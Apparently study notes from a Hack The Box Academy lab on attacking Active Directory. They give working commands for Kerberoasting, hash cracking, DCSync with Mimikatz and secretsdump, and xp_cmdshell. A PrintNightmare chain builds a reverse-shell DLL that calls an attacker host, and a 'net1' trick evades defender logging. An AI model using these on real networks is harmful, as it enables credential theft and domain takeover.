Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.

Get-MpComputerStatus
```powershell
PS C:\htb> Get-MpComputerStatus
```

## Am I Alone?

Using qwinsta
```powershell
PS C:\htb> qwinsta
```

## Network Information

|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show state`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|

## Windows Management Instrumentation (WMI)

Quick WMI checks

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |
Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.

```powershell
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

## Net Commands

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

> [!NOTE] Net Commands Trick
> If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

## Dsquery

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

User Search

```powershell
PS C:\htb> dsquery user
```

Computer Search

```powershell
PS C:\htb> dsquery computer
```

Wildcard Search

```powershell
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

Users With Specific Attributes Set (PASSWD_NOTREQD)

```powershell
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

Searching for Domain Controllers

```powershell
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

Disabled Administrative Accounts with Non-Empty Description

```powershell
dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
```

# Kerberoasting - from Linux

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

## GetUserSPNs.py

Listing SPN Accounts with GetUserSPNs.py

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Requesting all TGS Tickets

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

Requesting a Single TGS ticket

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

Saving the TGS Ticket to an Output File

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

Cracking the Ticket Offline with Hashcat

```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

# Kerberoasting - from Windows

## setspn.exe (old style)

Enumerating SPNs with setspn.exe

```shell
setspn.exe -Q */*
```

Targeting a Single User

```powershell
Add-Type -AssemblyName System.IdentityModel
```

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

Retrieving All Tickets Using setspn.exe

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Extracting Tickets from Memory with Mimikatz

```shell
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export 
```

#### Preparing the Base64 Blob for Cracking

```shell
echo "<base64 blob>" |  tr -d \\n 
```

#### Placing the Output into a File as .kirbi

```shell
cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

#### Extracting the Kerberos Ticket using kirbi2john.py

```shell
python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

#### Modifiying crack_file for Hashcat

```shell
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

## Automated / Tool Based Route

#### Using PowerView to Extract TGS Tickets

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

#### Using PowerView to Target a Specific User

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

#### Exporting All Tickets to a CSV File

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

#### Viewing the Contents of the .CSV File

```powershell
cat .\ilfreight_tgs.csv
```

## Using Rubeus

### Using the /stats Flag

```powershell
.\Rubeus.exe kerberoast /stats
```

### Using the /nowrap Flag

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## A Note on Encryption Types

For AES, we need to use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)` per the handy Hashcat [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing `s` to see the status of the cracking job.

```shell
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

> [!NOTE]
> Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.

# ACEs and ACLs

 Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`

- [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
- [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
- `AddSelf` - shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

![[Active Directory Enumeration & Attacks ACL_attacks_graphic.png]]

# DCSync

**What is DCSync and How Does it Work?**

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.



## secretsdump.py

Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

```shell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

- Number and % of passwords cracked
- top 10 passwords
- Password length metrics
- Password re-use

reflect only active user accounts in the domain.

If we check the files created using the `-just-dc` flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.

```shell
ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

## Mimikatz

We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.

Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:

Using runas.exe

```shell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

```powershell
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

# Privileged Access

Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.

`But what if we don't yet have local admin rights on any hosts in the domain?`

There are several other ways we can move around a Windows domain:

- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:

- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

## RDP

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

## WinRM

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

## SQL Server Admin

BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

```shell
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

```shell
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

```shell
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

# Bleeding Edge Vulnerabilities

## Zerologon

```embed
title: "Zerologon (CVE-2020-1472): Overview, Exploit Steps and Prevention"
image: "https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2020/12/Blog_1060x698-8-1.jpg"
description: "Learn everything you need to know about the Microsoft exploit Zerologon, what we believe is the most critical Active Directory vulnerability discovered this year."
url: "https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/"
```


Test https://github.com/SecuraBV/CVE-2020-1472

Exploit https://github.com/dirkjanm/CVE-2020-1472

## DCShadow

```embed
title: "What a DCShadow Attack Is and How to Defend Against It"
image: "https://cdn-blog.netwrix.com/wp-content/uploads/2023/04/Cybersecurity_Cyber-Attack.jpg"
description: "Learn how a DCShadow attack unfolds and how Netwrix solutions can help you detect them promptly and respond effectively."
url: "https://blog.netwrix.com/2022/09/28/dcshadow_attack/"
```

## NoPac (SamAccountName Spoofing)

A great example of an emerging threat is the [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing` released at the end of 2021. This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.

|42278|42287|
|---|---|
|`42278` is a bypass vulnerability with the Security Account Manager (SAM).|`42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|

This exploit path takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller. By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).

We can use this [tool](https://github.com/Ridter/noPac) to perform this attack.

## PrintNightmare

`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution.

Exploit: [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)

Enumerating for MS-RPRN
```shell
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Generating a DLL Payload
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

Creating a Share with smbserver.py
```shell
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Configuring & Starting MSF multi/handler
```shell
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```

Running the Exploit
```shell
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

## PetitPotam (MS-EFSRPC)

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

# Miscellaneous Misconfigurations

## Exchange Related Group Membership

A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.

The Exchange group `Organization Management` is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`.

## PrivExchange

The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

## Printer Bug

The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, and force the server to authenticate to any host provided by the client over SMB.

We can use tools such as the `Get-SpoolStatus` module from [this](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) tool (that can be found on the spawned target) or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check for machines vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.

**Enumerating for MS-PRN Printer Bug**

```powershell
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

## MS14-068

This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine [Mantis](https://app.hackthebox.com/machines/98) on the Hack The Box platform showcases this vulnerability.

## Sniffing LDAP Credentials

Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).

## Enumerating DNS Records

We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as `BloodHound` is similar to `SRV01934.INLANEFREIGHT.LOCAL`. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as `JENKINS.INLANEFREIGHT.LOCAL`, which we can use to better plan out our attacks.

The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

On the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.

**Using the -r Option to Resolve Unknown Records**

```shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

## Other Misconfigurations

### Finding Passwords in the Description Field using Get-Domain User

```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

### PASSWD_NOTREQD Field

Checking for PASSWD_NOTREQD Setting using Get-DomainUser

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Credentials in SMB Shares and SYSVOL Scripts

The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain.

### Group Policy Preferences (GPP) Passwords

